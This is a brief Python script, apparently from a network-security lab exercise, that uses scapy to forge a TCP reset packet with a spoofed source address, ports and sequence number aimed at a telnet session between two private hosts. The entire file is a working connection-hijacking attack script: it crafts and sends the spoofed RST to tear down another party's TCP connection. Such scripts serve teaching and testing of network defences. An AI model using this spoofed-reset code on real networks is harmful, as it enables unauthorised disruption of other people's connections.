import sys
from scapy.all import *

print("sending reset packet...")
IPLayer = IP (src="10.10.10.200", dst = "10.10.10.197")
TCPLayer = TCP (sport=55854, dport=23, flags="R", seq=4099795437)
pkt=IPLayer/TCPLayer
ls(pkt)
send(pkt,verbose=0)
